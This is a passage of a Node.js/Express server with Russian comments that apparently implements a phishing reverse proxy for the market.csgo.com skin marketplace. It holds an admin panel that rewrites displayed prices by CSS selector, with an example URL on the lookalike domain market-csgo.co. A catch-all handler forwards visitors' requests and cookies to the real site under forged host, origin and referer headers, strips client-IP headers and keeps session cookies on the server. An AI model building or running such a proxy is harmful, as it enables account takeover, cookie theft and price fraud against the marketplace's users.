                    customPagesList = await response.json();
                    renderCustomPagesList();
                } catch (error) {
                    console.error('Ошибка загрузки:', error);
                    customPagesListEl.innerHTML = `
                        <div class="alert alert-danger">
                            Ошибка при загрузке списка: ${error.message}
                        </div>
                    `;
                }
            }
            
            // Отображение списка модифицированных страниц
            function renderCustomPagesList() {
                if (customPagesList.length === 0) {
                    customPagesListEl.innerHTML = `
                        <div class="text-center py-4 text-muted">
                            <i class="bi bi-info-circle"></i>
                            Нет модифицированных страниц
                        </div>
                    `;
                    return;
                }
                
                customPagesListEl.innerHTML = '';
                
                // Сортируем по дате изменения (сначала новые)
                customPagesList.sort((a, b) => b.timestamp - a.timestamp);
                
                customPagesList.forEach(item => {
                    const listItem = document.createElement('div');
                    listItem.className = 'list-group-item';
                    
                    listItem.innerHTML = `
                        <div class="ms-2 me-auto">
                            <div class="d-flex align-items-center">
                                <div class="url-preview" title="${item.url}">${item.url}</div>
                                <span class="badge bg-primary ms-2">${item.selector}</span>
                            </div>
                            <div class="d-flex justify-content-between align-items-center mt-1">
                                <div class="value-preview" title="${item.value}">${item.value}</div>
                                <div class="modified-time">${formatDate(item.timestamp)}</div>
                            </div>
                        </div>
                        <div class="actions">
                            <button class="btn btn-sm btn-info view-btn" data-url="${item.url}">
                                <i class="bi bi-eye"></i>
                            </button>
                            <button class="btn btn-sm btn-warning edit-btn" data-url="${item.url}">
                                <i class="bi bi-pencil"></i>
                            </button>
                            <button class="btn btn-sm btn-danger delete-btn" data-url="${item.url}">
                                <i class="bi bi-trash"></i>
                            </button>
                        </div>
                    `;
                    
                    // Добавляем обработчики событий для кнопок
                    const viewBtn = listItem.querySelector('.view-btn');
                    const editBtn = listItem.querySelector('.edit-btn');
                    const deleteBtn = listItem.querySelector('.delete-btn');
                    
                    viewBtn.addEventListener('click', () => showDetails(item.url));
                    editBtn.addEventListener('click', () => editItem(item.url));
                    deleteBtn.addEventListener('click', () => showDeleteConfirmation(item.url));
                    
                    customPagesListEl.appendChild(listItem);
                });
            }
            
            // Показать подробную информацию о модификации
            function showDetails(url) {
                const item = customPagesList.find(item => item.url === url);
                if (!item) return;
                
                document.getElementById('detailUrl').textContent = item.url;
                document.getElementById('detailSelector').textContent = item.selector;
                document.getElementById('detailValue').textContent = item.value;
                document.getElementById('detailTimestamp').textContent = formatDate(item.timestamp);
                
                const viewPageBtn = document.getElementById('viewPageBtn');
                viewPageBtn.href = item.url;
                
                const editItemBtn = document.getElementById('editItemBtn');
                editItemBtn.onclick = () => {
                    detailsModal.hide();
                    editItem(item.url);
                };
                
                detailsModal.show();
            }
            
            // Редактирование существующей модификации
            function editItem(url) {
                const item = customPagesList.find(item => item.url === url);
                if (!item) return;
                
                pageUrlInput.value = item.url;
                cssSelectorInput.value = item.selector;
                customValueInput.value = item.value;
                
                // Обновляем предпросмотр
                previewModification();
                
                // Прокручиваем к форме
                form.scrollIntoView({ behavior: 'smooth' });
            }
            
            // Показать модальное окно подтверждения удаления
            function showDeleteConfirmation(url) {
                deleteUrl = url;
                document.getElementById('deleteModalUrl').textContent = url;
                deleteModal.show();
            }
            
            // Удаление модификации
            async function deleteCustomPage() {
                if (!deleteUrl) return;
                
                try {
                    const response = await fetch('/admin-api/delete-custom-page', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ url: deleteUrl })
                    });
                    
                    if (!response.ok) {
                        const errorData = await response.json();
                        throw new Error(errorData.error || 'Ошибка при удалении');
                    }
                    
                    showToast('Настройки успешно удалены');
                    await loadCustomPages();
                } catch (error) {
                    console.error('Ошибка удаления:', error);
                    showToast('Ошибка при удалении: ' + error.message, 'danger');
                } finally {
                    deleteModal.hide();
                    deleteUrl = '';
                }
            }
            
            // Улучшенная функция тестирования селектора
            function testSelector() {
                const url = pageUrlInput.value.trim();
                const selector = cssSelectorInput.value.trim();
                const value = customValueInput.value;
                
                if (!url || !selector) {
                    showToast('Пожалуйста, введите URL и селектор', 'warning');
                    return;
                }
                
                // Показываем индикатор процесса
                showToast('Открываем страницу для проверки селектора...', 'info');
                
                // Открываем новое окно с указанной страницей
                const testWindow = window.open(url, '_blank');
                
                // Подготавливаем скрипт для инъекции в тестовое окно
                const testScript = `
                (function() {
                    console.log('🔍 Начинаем проверку селектора:', '${selector.replace(/'/g, "\\'")}');
                    
                    // Создаем стили для подсветки
                    const style = document.createElement('style');
                    style.textContent = \`
                        .selector-test-highlight {
                            outline: 3px solid red !important;
                            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5) !important;
                            position: relative !important;
                            background-color: rgba(255, 0, 0, 0.1) !important;
                        }
                        
                        .selector-test-overlay {
                            position: fixed;
                            bottom: 20px;
                            right: 20px;
                            background: rgba(0, 0, 0, 0.8);
                            color: white;
                            z-index: 999999;
                            padding: 15px;
                            border-radius: 5px;
                            font-family: Arial, sans-serif;
                            max-width: 300px;
                            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
                        }
                        
                        .selector-test-tooltip {
                            position: absolute;
                            background: rgba(0, 0, 0, 0.8);
                            color: white;
                            padding: 5px 10px;
                            border-radius: 3px;
                            font-size: 12px;
                            z-index: 999999;
                            max-width: 250px;
                            word-break: break-word;
                        }
                        
                        .selector-test-value {
                            color: #6ff;
                            font-family: monospace;
                            padding: 3px 6px;
                            background: rgba(0, 0, 0, 0.3);
                            border-radius: 3px;
                            margin: 5px 0;
                            display: block;
                            word-break: break-word;
                        }
                        
                        .selector-test-new-value {
                            color: #6f6;
                            font-family: monospace;
                            padding: 3px 6px;
                            background: rgba(0, 0, 0, 0.3);
                            border-radius: 3px;
                            margin: 5px 0;
                            display: block;
                            word-break: break-word;
                        }
                    \`;
                    document.head.appendChild(style);
                    
                    // Функция для проверки селектора
                    function checkSelector() {
                        try {
                            // Находим элементы по селектору
                            const elements = document.querySelectorAll('${selector.replace(/'/g, "\\'")}');
                            const found = elements && elements.length > 0;
                            const values = [];
                            
                            if (found) {
                                // Создаем информационное окно
                                const overlay = document.createElement('div');
                                overlay.className = 'selector-test-overlay';
                                overlay.innerHTML = \`
                                    <div style="font-weight: bold; margin-bottom: 10px;">
                                        Найдено элементов: \${elements.length}
                                    </div>
                                    <div style="margin-bottom: 10px;">
                                        <span style="color: #aaa;">Селектор:</span>
                                        <div class="selector-test-value">${selector.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>
                                    </div>
                                    <div id="selector-test-original-value">
                                        <span style="color: #aaa;">Текущее значение:</span>
                                    </div>
                                    <div style="margin: 10px 0;">
                                        <span style="color: #aaa;">Будет заменено на:</span>
                                        <div class="selector-test-new-value">${value.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>
                                    </div>
                                    <div style="margin-top: 10px; font-size: 12px; color: #aaa;">
                                        Нажмите ESC, чтобы закрыть это окно
                                    </div>
                                \`;
                                document.body.appendChild(overlay);
                                
                                // Подсвечиваем каждый найденный элемент
                                elements.forEach((el, index) => {
                                    // Сохраняем значение
                                    values.push(el.innerHTML);
                                    
                                    // Добавляем класс для подсветки
                                    el.classList.add('selector-test-highlight');
                                    
                                    // Создаем всплывающую подсказку
                                    const tooltip = document.createElement('div');
                                    tooltip.className = 'selector-test-tooltip';
                                    tooltip.innerHTML = \`Элемент #\${index + 1}\`;
                                    
                                    // Позиционируем подсказку
                                    const rect = el.getBoundingClientRect();
                                    tooltip.style.top = (rect.top + window.scrollY - 30) + 'px';
                                    tooltip.style.left = (rect.left + window.scrollX) + 'px';
                                    
                                    document.body.appendChild(tooltip);
                                    
                                    // Добавляем обработчик наведения
                                    el.addEventListener('mouseenter', () => {
                                        el.style.backgroundColor = 'rgba(255, 0, 0, 0.3) !important';
                                        tooltip.style.backgroundColor = 'rgba(255, 0, 0, 0.8)';
                                    });
                                    
                                    el.addEventListener('mouseleave', () => {
                                        el.style.backgroundColor = 'rgba(255, 0, 0, 0.1) !important';
                                        tooltip.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
                                    });
                                    
                                    // Прокручиваем к первому элементу
                                    if (index === 0) {
                                        el.scrollIntoView({
                                            behavior: 'smooth',
                                            block: 'center'
                                        });
                                    }
                                });
                                
                                // Отображаем текущее значение первого элемента
                                if (values.length > 0) {
                                    const valueDisplay = document.getElementById('selector-test-original-value');
                                    valueDisplay.innerHTML += \`<div class="selector-test-value">\${values[0].replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>\`;
                                }
                                
                                // Обработчик клавиши ESC для закрытия окна
                                document.addEventListener('keydown', (e) => {
                                    if (e.key === 'Escape') {
                                        const overlay = document.querySelector('.selector-test-overlay');
                                        if (overlay) overlay.remove();
                                        
                                        document.querySelectorAll('.selector-test-tooltip').forEach(el => el.remove());
                                        document.querySelectorAll('.selector-test-highlight').forEach(el => {
                                            el.classList.remove('selector-test-highlight');
                                        });
                                    }
                                });
                                
                                // Отправляем результат в родительское окно
                                window.opener.postMessage({
                                    type: 'selectorTestResult',
                                    found: true,
                                    count: elements.length,
                                    currentValue: values[0] || ''
                                }, '*');
                                
                                console.log('✅ Селектор проверен, найдено элементов:', elements.length);
                            } else {
                                console.warn('⚠️ Элементы не найдены по селектору:', '${selector.replace(/'/g, "\\'")}');
                                
                                // Создаем информационное окно с ошибкой
                                const overlay = document.createElement('div');
                                overlay.className = 'selector-test-overlay';
                                overlay.style.backgroundColor = 'rgba(200, 0, 0, 0.8)';
                                overlay.innerHTML = \`
                                    <div style="font-weight: bold; margin-bottom: 10px;">
                                        ⚠️ Элементы не найдены!
                                    </div>
                                    <div style="margin-bottom: 10px;">
                                        <span style="color: #aaa;">Селектор:</span>
                                        <div class="selector-test-value">${selector.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>
                                    </div>
                                    <div style="margin-top: 15px;">
                                        <button id="try-simpler-selector" style="background: #555; border: none; color: white; padding: 5px 10px; border-radius: 3px; cursor: pointer;">
                                            Попробовать упрощенный селектор
                                        </button>
                                    </div>
                                    <div style="margin-top: 10px; font-size: 12px; color: #aaa;">
                                        Нажмите ESC, чтобы закрыть это окно
                                    </div>
                                \`;
                                document.body.appendChild(overlay);
                                
                                // Обработчик для упрощенного селектора
                                document.getElementById('try-simpler-selector').addEventListener('click', () => {
                                    // Пробуем найти элемент цены любым способом
                                    const priceSelectors = [
                                        'app-page-inventory-price > div > span:first-child',
                                        'app-page-inventory-price span',
                                        '[class*="price"] > span',
                                        '[class*="price-value"]',
                                        'span[class*="price"]'
                                    ];
                                    
                                    // Удаляем текущее окно
                                    overlay.remove();
                                    
                                    // Пробуем каждый селектор
                                    for (const simplifiedSelector of priceSelectors) {
                                        const elements = document.querySelectorAll(simplifiedSelector);
                                        if (elements && elements.length > 0) {
                                            // Нашли элементы, показываем сообщение
                                            const newOverlay = document.createElement('div');
                                            newOverlay.className = 'selector-test-overlay';
                                            newOverlay.style.backgroundColor = 'rgba(0, 150, 0, 0.8)';
                                            newOverlay.innerHTML = \`
                                                <div style="font-weight: bold; margin-bottom: 10px;">
                                                    ✅ Найдено с упрощенным селектором!
                                                </div>
                                                <div style="margin-bottom: 10px;">
                                                    <span style="color: #aaa;">Новый селектор:</span>
                                                    <div class="selector-test-value">\${simplifiedSelector}</div>
                                                </div>
                                                <div style="margin-bottom: 10px;">
                                                    <span style="color: #aaa;">Найдено элементов:</span>
                                                    <div class="selector-test-value">\${elements.length}</div>
                                                </div>
                                                <div style="margin-top: 10px;">
                                                    <button id="use-new-selector" style="background: #555; border: none; color: white; padding: 5px 10px; border-radius: 3px; cursor: pointer;">
                                                        Использовать этот селектор
                                                    </button>
                                                </div>
                                            \`;
                                            document.body.appendChild(newOverlay);
                                            
                                            // Подсвечиваем найденные элементы
                                            elements.forEach((el, index) => {
                                                el.classList.add('selector-test-highlight');
                                                
                                                // Прокручиваем к первому элементу
                                                if (index === 0) {
                                                    el.scrollIntoView({
                                                        behavior: 'smooth',
                                                        block: 'center'
                                                    });
                                                }
                                            });
                                            
                                            // Обработчик для использования нового селектора
                                            document.getElementById('use-new-selector').addEventListener('click', () => {
                                                window.opener.postMessage({
                                                    type: 'useNewSelector',
                                                    selector: simplifiedSelector,
                                                    count: elements.length,
                                                    currentValue: elements[0].innerHTML || ''
                                                }, '*');
                                                newOverlay.remove();
                                            });
                                            
                                            // Нашли что-то, прерываем цикл
                                            return;
                                        }
                                    }
                                    
                                    // Если ничего не нашли
                                    const failOverlay = document.createElement('div');
                                    failOverlay.className = 'selector-test-overlay';
                                    failOverlay.style.backgroundColor = 'rgba(200, 0, 0, 0.8)';
                                    failOverlay.innerHTML = \`
                                        <div style="font-weight: bold; margin-bottom: 10px;">
                                            ❌ Не удалось найти элементы даже с упрощенными селекторами!
                                        </div>
                                        <div style="margin-top: 10px;">
                                            Попробуйте другой URL или используйте инструменты разработчика браузера для определения правильного селектора.
                                        </div>
                                    \`;
                                    document.body.appendChild(failOverlay);
                                });
                                
                                // Обработчик клавиши ESC для закрытия окна
                                document.addEventListener('keydown', (e) => {
                                    if (e.key === 'Escape') {
                                        const overlay = document.querySelector('.selector-test-overlay');
                                        if (overlay) overlay.remove();
                                    }
                                });
                                
                                // Отправляем результат в родительское окно
                                window.opener.postMessage({
                                    type: 'selectorTestResult',
                                    found: false,
                                    error: 'Элементы не найдены'
                                }, '*');
                            }
                        } catch (error) {
                            console.error('❌ Ошибка при проверке селектора:', error);
                            
                            // Отправляем ошибку в родительское окно
                            window.opener.postMessage({
                                type: 'selectorTestResult',
                                found: false,
                                error: error.message
                            }, '*');
                            
                            // Показываем ошибку
                            const overlay = document.createElement('div');
                            overlay.className = 'selector-test-overlay';
                            overlay.style.backgroundColor = 'rgba(200, 0, 0, 0.8)';
                            overlay.innerHTML = \`
                                <div style="font-weight: bold; margin-bottom: 10px;">
                                    ❌ Ошибка при проверке селектора!
                                </div>
                                <div style="margin-bottom: 10px;">
                                    <span style="color: #aaa;">Селектор:</span>
                                    <div class="selector-test-value">${selector.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>
                                </div>
                                <div style="margin-bottom: 10px;">
                                    <span style="color: #aaa;">Ошибка:</span>
                                    <div class="selector-test-value">\${error.message}</div>
                                </div>
                            \`;
                            document.body.appendChild(overlay);
                        }
                    }
                    
                    // Ждем немного, пока страница полностью загрузится
                    setTimeout(checkSelector, 1000);
                    
                    // Также запускаем проверку при полной загрузке страницы
                    window.addEventListener('load', () => {
                        setTimeout(checkSelector, 500);
                    });
                })();
                `;
                
                // Добавляем скрипт в новое окно после загрузки
                testWindow.addEventListener('load', () => {
                    try {
                        // Создаем и добавляем скрипт
                        const script = testWindow.document.createElement('script');
                        script.textContent = testScript;
                        testWindow.document.head.appendChild(script);
                    } catch (e) {
                        console.error('Ошибка при добавлении скрипта в тестовое окно:', e);
                        showToast('Не удалось проверить селектор: ' + e.message, 'danger');
                    }
                });
            }
            
            // УЛУЧШЕНО: Сохранение настроек страницы с валидацией селектора
            async function saveCustomPage(e) {
                e.preventDefault();
                
                const url = pageUrlInput.value.trim();
                const selector = cssSelectorInput.value.trim();
                const value = customValueInput.value;
                
                if (!url || !selector || value === undefined) {
                    showToast('Пожалуйста, заполните все поля', 'danger');
                    return;
                }
                
                // Показываем индикатор загрузки
                const submitBtn = document.querySelector('#customPageForm button[type="submit"]');
                const originalText = submitBtn.innerHTML;
                submitBtn.disabled = true;
                submitBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Сохранение...';
                
                try {
                    // Сначала проверяем валидность селектора
                    const validationResponse = await fetch('/admin-api/validate-selector', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ selector })
                    });
                    
                    const validationData = await validationResponse.json();
                    if (!validationData.valid) {
                        throw new Error('Неверный селектор: ' + validationData.message);
                    }
                    
                    // Затем сохраняем настройки
                    const response = await fetch('/admin-api/save-custom-page', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ url, selector, value })
                    });
                    
                    if (!response.ok) {
                        const errorData = await response.json();
                        throw new Error(errorData.error || 'Ошибка при сохранении');
                    }
                    
                    showToast('✅ Настройки успешно сохранены и активированы! Изменения вступят в силу немедленно.', 'success');
                    
                    // Предлагаем проверить настройки
                    if (confirm('Настройки сохранены. Хотите открыть страницу и проверить, что изменения применились?')) {
                        window.open(url, '_blank');
                    }
                    
                    await loadCustomPages();
                    
                    // Очищаем форму
                    document.getElementById('customPageForm').reset();
                    
                    // Очищаем предпросмотр
                    const previewContainer = document.getElementById('valuePreview');
                    if (previewContainer) {
                        previewContainer.remove();
                    }
                } catch (error) {
                    console.error('Ошибка сохранения:', error);
                    showToast('❌ Ошибка при сохранении: ' + error.message, 'danger');
                } finally {
                    // Восстанавливаем кнопку
                    submitBtn.disabled = false;
                    submitBtn.innerHTML = originalText;
                }
            }
            
            // НОВОЕ: Функция предварительного просмотра значения
            function previewModification() {
                const value = customValueInput.value;
                const previewContainer = document.getElementById('valuePreview');
                
                if (!previewContainer) {
                    // Создаем контейнер для предпросмотра, если его нет
                    const container = document.createElement('div');
                    container.id = 'valuePreview';
                    container.className = 'mt-3 p-3 border rounded bg-light';
                    container.innerHTML = `
                        <h6 class="mb-2">Предпросмотр значения:</h6>
                        <div class="preview-content">${value}</div>
                    `;
                    
                    const customValueInput = document.getElementById('customValue');
                    customValueInput.parentNode.appendChild(container);
                } else {
                    // Обновляем существующий контейнер
                    const previewContent = previewContainer.querySelector('.preview-content');
                    if (previewContent) {
                        previewContent.innerHTML = value;
                    }
                }
            }
            
            // НОВОЕ: Функция проверки состояния модификаций
            function checkModificationsStatus() {
                fetch('/admin-api/check-modifications-status')
                    .then(response => response.json())
                    .then(data => {
                        const statusBadge = document.getElementById('modificationsStatusBadge');
                        if (statusBadge) {
                            statusBadge.className = `badge ${data.active > 0 ? 'bg-success' : 'bg-secondary'}`;
                            statusBadge.textContent = `${data.active} активных модификаций`;
                            
                            const lastUpdate = new Date(data.lastUpdated).toLocaleString();
                            statusBadge.title = `Последнее обновление: ${lastUpdate}`;
                        }
                    })
                    .catch(error => {
                        console.error('Ошибка при проверке статуса модификаций:', error);
                    });
            }
            
            // Сброс всех модификаций
            async function resetAllCustomPages() {
                try {
                    const response = await fetch('/admin-api/reset-all-custom-pages', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({})
                    });
                    
                    if (!response.ok) {
                        const errorData = await response.json();
                        throw new Error(errorData.error || 'Ошибка при сбросе всех модификаций');
                    }
                    
                    showToast('Все модификации успешно сброшены', 'success');
                    await loadCustomPages();
                } catch (error) {
                    console.error('Ошибка сброса:', error);
                    showToast('Ошибка при сбросе модификаций: ' + error.message, 'danger');
                } finally {
                    resetAllModal.hide();
                }
            }
            
            // Функция для очистки кеша
            function clearCache() {
                try {
                    fetch('/admin-api/clear-cache', { method: 'POST' })
                        .then(response => response.json())
                        .then(data => {
                            if (data.success) {
                                showToast('Кеш успешно очищен', 'success');
                            } else {
                                showToast('Ошибка при очистке кеша: ' + (data.error || 'Неизвестная ошибка'), 'danger');
                            }
                        })
                        .catch(error => {
                            console.error('Ошибка при очистке кеша:', error);
                            showToast('Ошибка при очистке кеша: ' + error.message, 'danger');
                        });
                } catch (error) {
                    console.error('Ошибка при очистке кеша:', error);
                    showToast('Ошибка при очистке кеша: ' + error.message, 'danger');
                }
            }
            
            // Обработчик сообщений от тестового окна
            window.addEventListener('message', (event) => {
                if (event.data && event.data.type === 'selectorTestResult') {
                    if (event.data.found) {
                        showToast(`✅ Найдено ${event.data.count} элемент(ов) по селектору!`, 'success');
                        
                        // Добавляем визуальную индикацию соответствия текущего значения и нового
                        const customValueInput = document.getElementById('customValue');
                        if (customValueInput && event.data.currentValue) {
                            // Отображаем текущее значение
                            const currentValueDisplay = document.createElement('div');
                            currentValueDisplay.className = 'alert alert-info mt-2';
                            currentValueDisplay.innerHTML = `
                                <strong>Текущее значение:</strong>
                                <pre class="mt-2 p-2 bg-light">${event.data.currentValue.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>
                                <button class="btn btn-sm btn-outline-primary mt-2" id="useCurrent">Использовать как основу</button>
                            `;
                            
                            // Удаляем предыдущее отображение, если оно есть
                            const existingDisplay = document.getElementById('currentValueDisplay');
                            if (existingDisplay) {
                                existingDisplay.remove();
                            }
                            
                            // Добавляем новое отображение
                            currentValueDisplay.id = 'currentValueDisplay';
                            customValueInput.parentNode.appendChild(currentValueDisplay);
                            
                            // Обработчик для кнопки использования текущего значения
                            document.getElementById('useCurrent').addEventListener('click', () => {
                                customValueInput.value = event.data.currentValue;
                                previewModification();
                                currentValueDisplay.remove();
                            });
                        }
                    } else {
                        showToast(`⚠️ Элементы по указанному селектору не найдены. ${event.data.error || ''}`, 'warning');
                    }
                } else if (event.data && event.data.type === 'useNewSelector') {
                    // Пользователь выбрал новый селектор в тестовом окне
                    const selectorInput = document.getElementById('cssSelector');
                    selectorInput.value = event.data.selector;
                    
                    showToast(`✅ Селектор обновлен на более надежный: ${event.data.selector}`, 'success');
                    
                    // Отображаем текущее значение
                    const customValueInput = document.getElementById('customValue');
                    if (customValueInput && event.data.currentValue) {
                        // Удаляем предыдущее отображение, если оно есть
                        const existingDisplay = document.getElementById('currentValueDisplay');
                        if (existingDisplay) {
                            existingDisplay.remove();
                        }
                        
                        // Создаем новое отображение
                        const currentValueDisplay = document.createElement('div');
                        currentValueDisplay.className = 'alert alert-success mt-2';
                        currentValueDisplay.innerHTML = `
                            <strong>Текущее значение по новому селектору:</strong>
                            <pre class="mt-2 p-2 bg-light">${event.data.currentValue.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>
                            <button class="btn btn-sm btn-outline-primary mt-2" id="useCurrent">Использовать как основу</button>
                        `;
                        
                        // Добавляем новое отображение
                        currentValueDisplay.id = 'currentValueDisplay';
                        customValueInput.parentNode.appendChild(currentValueDisplay);
                        
                        // Обработчик для кнопки использования текущего значения
                        document.getElementById('useCurrent').addEventListener('click', () => {
                            customValueInput.value = event.data.currentValue;
                            previewModification();
                            currentValueDisplay.remove();
                        });
                    }
                }
            });
            
            // Добавляем поддержку для URL с шаблонами
            document.getElementById('pageUrl').addEventListener('change', function() {
                const urlInput = document.getElementById('pageUrl');
                const url = urlInput.value.trim();
                
                // Проверяем, содержит ли URL параметр id=
                if (url.includes('id=')) {
                    const idMatch = /id=([0-9]+)/.exec(url);
                    if (idMatch && idMatch[1]) {
                        const baseUrl = url.split('?')[0];
                        const id = idMatch[1];
                        
                        // Предлагаем использовать шаблон
                        const templateSuggestion = document.createElement('div');
                        templateSuggestion.className = 'alert alert-info mt-2';
                        templateSuggestion.innerHTML = `
                            <strong>Совет:</strong> Вы можете использовать шаблон для всех товаров этого типа:<br>
                            <code>${baseUrl}*</code>
                            <button class="btn btn-sm btn-outline-primary mt-2" id="useTemplate">Использовать шаблон</button>
                        `;
                        
                        // Удаляем предыдущее предложение, если оно есть
                        const existingSuggestion = document.getElementById('templateSuggestion');
                        if (existingSuggestion) {
                            existingSuggestion.remove();
                        }
                        
                        // Добавляем новое предложение
                        templateSuggestion.id = 'templateSuggestion';
                        urlInput.parentNode.appendChild(templateSuggestion);
                        
                        // Обработчик для кнопки использования шаблона
                        document.getElementById('useTemplate').addEventListener('click', () => {
                            urlInput.value = `${baseUrl}*`;
                            templateSuggestion.remove();
                        });
                    }
                }
            });
            
            // Инициализация
            document.addEventListener('DOMContentLoaded', () => {
                // Загружаем список модифицированных страниц
                loadCustomPages();
                
                // Обработчики событий
                form.addEventListener('submit', saveCustomPage);
                confirmDeleteBtn.addEventListener('click', deleteCustomPage);
                confirmResetAllBtn.addEventListener('click', resetAllCustomPages);
                resetAllBtn.addEventListener('click', () => resetAllModal.show());
                testButton.addEventListener('click', testSelector);
                
                // Добавляем обработчик для кнопки сброса кеша
                const refreshCacheBtn = document.getElementById('refreshCacheBtn');
                if (refreshCacheBtn) {
                    refreshCacheBtn.addEventListener('click', clearCache);
                }
                
                // Добавляем обработчик для предпросмотра значения
                customValueInput.addEventListener('input', previewModification);
                
                // Добавляем индикатор состояния модификаций
                const cardHeader = document.querySelector('.card-header h5.card-title');
                if (cardHeader) {
                    const statusBadge = document.createElement('span');
                    statusBadge.id = 'modificationsStatusBadge';
                    statusBadge.className = 'badge bg-secondary ms-2';
                    statusBadge.textContent = 'Проверка...';
                    cardHeader.appendChild(statusBadge);
                    
                    // Проверяем текущее состояние
                    checkModificationsStatus();
                    
                    // Периодически проверяем состояние
                    setInterval(checkModificationsStatus, 10000);
                }
                
                // Добавляем предпросмотр при загрузке страницы, если есть значение
                if (customValueInput && customValueInput.value) {
                    previewModification();
                }
                
                // Добавляем подсказки для заполнения формы
                const urlPattern = document.createElement('div');
                urlPattern.className = 'form-text mt-1';
                urlPattern.innerHTML = '<strong>Совет:</strong> Вы можете использовать * как подстановочный знак для соответствия нескольким URL. Например: <code>https://market-csgo.co/ru/Gloves/*</code>';
                
                const urlInput = document.getElementById('pageUrl');
                if (urlInput && urlInput.parentNode) {
                    urlInput.parentNode.appendChild(urlPattern);
                }
                
                // Добавляем кнопку "Очистить форму"
                const formActions = document.querySelector('#customPageForm .btn-primary').parentNode;
                
                const resetButton = document.createElement('button');
                resetButton.type = 'button';
                resetButton.className = 'btn btn-outline-secondary ms-2';
                resetButton.textContent = 'Очистить форму';
                resetButton.addEventListener('click', function() {
                    document.getElementById('customPageForm').reset();
                    
                    // Удаляем дополнительные элементы
                    const currentValueDisplay = document.getElementById('currentValueDisplay');
                    if (currentValueDisplay) currentValueDisplay.remove();
                    
                    const templateSuggestion = document.getElementById('templateSuggestion');
                    if (templateSuggestion) templateSuggestion.remove();
                    
                    const valuePreview = document.getElementById('valuePreview');
                    if (valuePreview) valuePreview.remove();
                });
                
                if (formActions) {
                    formActions.appendChild(resetButton);
                }
                
                // Дополнительная кнопка для упрощенного селектора цены
                const selectorInput = document.getElementById('cssSelector');
                if (selectorInput) {
                    const selectorHelpText = selectorInput.nextElementSibling;
                    
                    const simplifyButton = document.createElement('button');
                    simplifyButton.type = 'button';
                    simplifyButton.className = 'btn btn-sm btn-outline-success mt-2';
                    simplifyButton.textContent = 'Использовать упрощенный селектор для цены';
                    simplifyButton.addEventListener('click', function() {
                        selectorInput.value = 'app-page-inventory-price > div > span:first-child';
                        
                        showToast('✅ Установлен упрощенный селектор для цены', 'success');
                    });
                    
                    // Добавляем кнопку после подсказки
                    if (selectorHelpText) {
                        selectorHelpText.appendChild(document.createElement('br'));
                        selectorHelpText.appendChild(simplifyButton);
                    } else {
                        selectorInput.parentNode.appendChild(simplifyButton);
                    }
                }
            });
        </script>
    </body>
    </html>
    `;
    
    res.send(html);
});

// ИСПРАВЛЕНО: Улучшен основной обработчик HTTP запросов с повторными попытками
app.use('*', async (req, res, next) => {
    try {
        // Пропускаем запросы к админке и API
        if (req.originalUrl.startsWith('/adminka') || req.originalUrl.startsWith('/admin-api')) {
            return next();
        }
        
        const baseUrl = getBaseUrl(req);
        const targetUrl = TARGET_HOST + req.originalUrl;
        const sessionId = req.cookies.sessionId || Math.random().toString(36).substring(7);
        const session = getSession(sessionId);
        
        // Устанавливаем sessionId если его нет
        if (!req.cookies.sessionId) {
            res.cookie('sessionId', sessionId, { 
                httpOnly: true, 
                secure: isSecure(req),
                sameSite: isSecure(req) ? 'none' : 'lax'
            });
        }
        
        // Собираем cookies для запроса
        const requestCookies = new Map([
            ...session.cookies,
            ...parseCookieHeader(req.headers.cookie)
        ]);
        
        console.log(`🌐 ${req.method} ${req.originalUrl} (${isSecure(req) ? 'HTTPS' : 'HTTP'})`);
        
        // ИСПРАВЛЕНО: Улучшенные настройки для axios
        const axiosConfig = {
            method: req.method,
            url: targetUrl,
            headers: {
                ...req.headers,
                'host': 'market.csgo.com',
                'origin': 'https://market.csgo.com',
                'referer': 'https://market.csgo.com/',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': req.headers['user-agent'] || 'Mozilla/5.0',
                'cookie': createCookieString(requestCookies),
                'connection': 'keep-alive'
            },
            data: req.body,
            responseType: 'arraybuffer',
            validateStatus: () => true,
            maxRedirects: 0,
            decompress: true,
            httpsAgent: httpsAgent,
            timeout: 30000
        };
        
        // Удаляем заголовки прокси
        delete axiosConfig.headers['x-forwarded-for'];
        delete axiosConfig.headers['x-forwarded-proto'];
        delete axiosConfig.headers['x-forwarded-host'];
        delete axiosConfig.headers['x-real-ip'];
        delete axiosConfig.headers['cf-connecting-ip'];
        delete axiosConfig.headers['cf-ipcountry'];
        
        // ИСПРАВЛЕНО: Добавляем повторные попытки для критичных запросов
        let retries = 0;
        const maxRetries = 3;
        let response = null;
        let lastError = null;
        
        // Определяем, требуются ли повторные попытки для этого запроса
        const isRetryableRequest = (
            req.originalUrl.includes('/js/chunk-') || 
            req.originalUrl.includes('/api/') ||
            req.originalUrl.includes('/graphql') ||
            req.method === 'POST'
        );
        
        const maxRetriesForThisRequest = isRetryableRequest ? maxRetries : 1;
        
        while (retries < maxRetriesForThisRequest) {
            try {
                if (retries > 0) {
                    console.log(`Retry ${retries}/${maxRetriesForThisRequest} for ${req.originalUrl}`);
                    await new Promise(resolve => setTimeout(resolve, 1000 * retries)); // Увеличивающаяся задержка
                }
                
                response = await axios(axiosConfig);
                
                // Если успешно, выходим из цикла
                if (response.status !== 500 || !isRetryableRequest) {
                    break;
                }
                
                console.warn(`Request returned 500, retry ${retries + 1}/${maxRetriesForThisRequest}`);
                retries++;
                
            } catch (error) {
                console.error(`Request failed (attempt ${retries + 1}/${maxRetriesForThisRequest}):`, error.message);
                lastError = error;
                retries++;
                
                if (retries >= maxRetriesForThisRequest) {
                    throw error;
                }
            }
        }
        
        // Если не смогли получить ответ после всех попыток
        if (!response) {
